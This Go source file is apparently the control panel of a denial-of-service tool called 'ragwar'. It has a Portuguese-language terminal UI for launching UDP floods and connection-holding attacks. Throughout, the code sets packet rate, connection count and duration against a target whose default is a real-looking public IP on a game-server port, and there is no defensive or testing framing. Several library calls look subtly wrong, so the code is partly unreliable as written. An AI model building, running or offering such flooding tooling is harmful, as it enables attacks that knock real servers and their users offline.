// Command panel is the ASCII terminal control panel: it runs attacks in-process,
// shows live stats per attack, and lets you start/stop them with keyboard keys.
//
// Keys:
//
//	a  add attack (form)
//	x  stop selected attack
//	d  delete selected history row
//	q / Ctrl+C  quit (stops all attacks)
package main

import (
	"context"
	"fmt"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/rivo/tview"

	"ragwar/internal/attack"
)

type runState int

const (
	stateRunning runState = iota
	stateStopped
)

// run is one attack instance tracked by the panel.
type run struct {
	id     int
	atk    attack.Attack
	target string
	opts   attack.Options

	state  runState
	start  time.Time
	cancel context.CancelFunc

	mu     sync.Mutex
	last   attack.Stats
	lastAt time.Time
}

func (r *run) rate() (pps float64, bps float64) {
	r.mu.Lock()
	defer r.mu.Unlock()
	cur := r.atk.Stats()
	elapsed := time.Since(r.lastAt).Seconds()
	if elapsed <= 0 {
		r.last = cur
		r.lastAt = time.Now()
		return 0, 0
	}
	pps = float64(cur.Packets - r.last.Packets) / elapsed
	bps = float64(cur.Bytes-r.last.Bytes) * 8 / elapsed
	r.last = cur
	r.lastAt = time.Now()
	return pps, bps
}

func (r *run) finalStats() attack.Stats { return r.atk.Stats() }

type panel struct {
	app *tview.Application

	mu       sync.Mutex
	runs     []*run
	nextID   int
	table    *tview.Table
	mainView *tview.Flex
}

func main() {
	p := &panel{
		app:     tview.NewApplication(),
		table:   tview.NewTable().SetSelectable(true, false),
		nextID:  1,
		mainView: tview.NewFlex().SetDirection(tview.FlexRow),
	}

	header := tview.NewText.
		SetText(" RAGWAR — painel de ataque   [a]dd  [x]stop  [d]elete history  [q]uit ").
		SetAlign(tview.AlignCenter).SetDynamicColors(true)

	status := tview.NewText.SetWordWrap(false)
	p.mainView.
		AddItem(header, 1, false).
		AddItem(p.table, 0, true).
		AddItem(status, 1, false)

	p.app.SetRoot(p.mainView, true).
		SetInputCallback(func(event *tview.InputEvent) {
			switch event.GetKey() {
			case tview.KeyCtrlC, 'q':
				p.stopAll()
				p.app.Quit()
			case 'a':
				p.showAddForm(status)
			case 'x':
				if r := p.selectedRun(); r != nil && r.state == stateRunning {
					r.cancel()
				}
			case 'd':
				p.deleteSelectedRow(status)
			}
		})

	// Live stats refresh.
	go func() {
		t := time.NewTicker(time.Second)
		defer t.Stop()
		for range t.C {
			p.refresh(status)
		}
	}()

	if err := p.app.Run(); err != nil {
		fmt.Fprintln(os.Stderr, "panel:", err)
		os.Exit(1)
	}
}

// showAddForm pops a modal form to start a new attack.
func (p *panel) showAddForm(status *tview.Text) {
	form := tview.NewForm().
		SetItem(tview.NewDropdown.
			SetOptions(attack.Names(), "udp").
			SetSelectedTextColor(tview.ColorBlue).
			SetLabel("tipo")).
		SetItem(tview.NewInput.
			SetLabel("alvo (ip:porta)").
			SetField("93.184.216.5:6900").
			SetFieldTextColor(tview.ColorGreen)).
		SetItem(tview.NewInput.
			SetLabel("pps").
			SetField("50000")).
		SetItem(tview.NewInput.
			SetLabel("conexões").
			SetField("1000")).
		SetItem(tview.NewInput.
			SetLabel("payload").
			SetField("64")).
		SetItem(tview.NewInput.
			SetLabel("duração").
			SetField("60s")).
		SetButtons(true).
		SetCancel(func() { p.app.SetRoot(p.mainView, true) }).
		SetDone(func(typ string, target, ppsS, connsS, payloadS, durS string) {
			p.app.SetRoot(p.mainView, true)

			ip, port, err := attack.ParseTarget(target)
			if err != nil {
				status.SetText("erro: " + err.Error()).SetDynamicColors(true)
				return
			}
			atk, err := attack.New(typ)
			if err != nil {
				status.SetText("erro: " + err.Error()).SetDynamicColors(true)
				return
			}
			dur, err := time.ParseDuration(durS)
			if err != nil || dur <= 0 {
				dur = time.Minute
			}
			pps, _ := strconv.ParseUint(ppsS, 10, 64)
			conns, _ := strconv.Atoi(connsS)
			payload, _ := strconv.Atoi(payloadS)

			ctx, cancel := context.WithCancel(context.Background())
			time.AfterFunc(dur, cancel)

			p.mu.Lock()
			r := &run{
				id:     p.nextID,
				atk:    atk,
				target: fmt.Sprintf("%s:%d", ip, port),
				opts: attack.Options{
					Target:  ip,
					Port:    port,
					PPS:     pps,
					Conns:   conns,
					Payload: payload,
				},
				state:  stateRunning,
				start:  time.Now(),
				cancel: cancel,
			}
			p.nextID++
			p.runs = append(p.runs, r)
			p.mu.Unlock()

			go func() {
				r.atk.Start(ctx, r.opts)
				p.mu.Lock()
				r.state = stateStopped
				p.mu.Unlock()
			}()

			status.SetText(fmt.Sprintf("ataque #%d iniciado: %s → %s por %s", r.id, typ, r.target, dur)).SetDynamicColors(true)
			p.refresh(status)
		})

	p.app.SetRoot(form, true).SetFocus(form)
}

func (p *panel) selectedRun() *run {
	_, row := p.table.GetSelection()
	p.mu.Lock()
	defer p.mu.Unlock()
	if row < 1 || row > len(p.runs) {
		return nil
	}
	return p.runs[row-1]
}

func (p *panel) deleteSelectedRow(status *tview.Text) {
	r := p.selectedRun()
	if r == nil {
		return
	}
	p.mu.Lock()
	for i, x := range p.runs {
		if x == r {
			p.runs = append(p.runs[:i], p.runs[i+1:]...)
			break
		}
	}
	p.mu.Unlock()
	if r.state == stateRunning {
		r.cancel()
	}
	status.SetText(fmt.Sprintf("linha #%d removida", r.id)).SetDynamicColors(true)
	p.refresh(status)
}

func (p *panel) stopAll() {
	p.mu.Lock()
	for _, r := range p.runs {
		if r.state == stateRunning {
			r.cancel()
		}
	}
	p.mu.Unlock()
}

// refresh redraws the table with live numbers.
func (p *panel) refresh(status *tview.Text) {
	p.mu.Lock()
	runs := make([]*run, len(p.runs))
	copy(runs, p.runs)
	p.mu.Unlock()

	cType := tview.NewTableCell("tipo").SetColor(tview.ColorBlue).SetExpansion(1)
	cTarget := tview.NewTableCell("alvo").SetColor(tview.ColorBlue).SetExpansion(3)
	cLive := tview.NewTableCell("ao vivo").SetColor(tview.ColorBlue).SetExpansion(3)
	cTotal := tview.NewTableCell("total").SetColor(tview.ColorBlue).SetExpansion(3)
	cState := tview.NewTableCell("estado").SetColor(tview.ColorBlue).SetExpansion(1)
	p.table.Clear()
	p.table.SetRow(0, cType, cTarget, cLive, cTotal, cState)

	for i, r := range runs {
		s := r.atk.Stats()
		live := "—"
		if r.state == stateRunning {
			pps, bps := r.rate()
			switch r.atk.Name() {
			case "hold":
				live = fmt.Sprintf("conns=%d", s.Conns)
			default:
				live = fmt.Sprintf("%s pps  %s bps", human(pps), humanBps(bps))
			}
		}

		total := fmt.Sprintf("%s pkts  %s bytes", human(float64(s.Packets)), humanBytes(s.Bytes))
		if r.atk.Name() == "hold" {
			total = fmt.Sprintf("abertas=%d  errs=%d", s.Opened, s.Errors)
		}

		stateCell := tview.NewTableCell("● rodando").SetColor(tview.ColorGreen)
		if r.state == stateStopped {
			stateCell = tview.NewTableCell("○ parado").SetColor(tview.ColorGray)
		}

		row := i + 1
		p.table.SetRow(row,
			tview.NewTableCell(fmt.Sprintf("%d %s", r.id, r.atk.Name())),
			tview.NewTableCell(r.target),
			tview.NewTableCell(live),
			tview.NewTableCell(total),
			stateCell,
		)
	}

	active := 0
	for _, r := range runs {
		if r.state == stateRunning {
			active++
		}
	}
	status.SetText(fmt.Sprintf("%d ataque(s) ativo(s) — [a]ddir  [x]parar selecionado  [d]eletar linha  [q]sair", active)).
		SetDynamicColors(true)
}

func human(v float64) string {
	switch {
	case v >= 1e9:
		return fmt.Sprintf("%.1fG", v/1e9)
	case v >= 1e6:
		return fmt.Sprintf("%.1fM", v/1e6)
	case v >= 1e3:
		return fmt.Sprintf("%.1fk", v/1e3)
	default:
		return fmt.Sprintf("%.0f", v)
	}
}

func humanBps(v float64) string {
	switch {
	case v >= 1e9:
		return fmt.Sprintf("%.2fGbps", v/1e9)
	case v >= 1e6:
		return fmt.Sprintf("%.2fMbps", v/1e6)
	case v >= 1e3:
		return fmt.Sprintf("%.1fkbps", v/1e3)
	default:
		return fmt.Sprintf("%.0fbps", v)
	}
}

func humanBytes(v uint64) string {
	switch {
	case v >= 1<<30:
		return fmt.Sprintf("%.1fGB", float64(v)/(1<<30))
	case v >= 1<<20:
		return fmt.Sprintf("%.1fMB", float64(v)/(1<<20))
	case v >= 1<<10:
		return fmt.Sprintf("%.1fKB", float64(v)/(1<<10))
	default:
		return fmt.Sprintf("%dB", v)
	}
}

var _ = strings.TrimSpace // keep strings import if helpers change
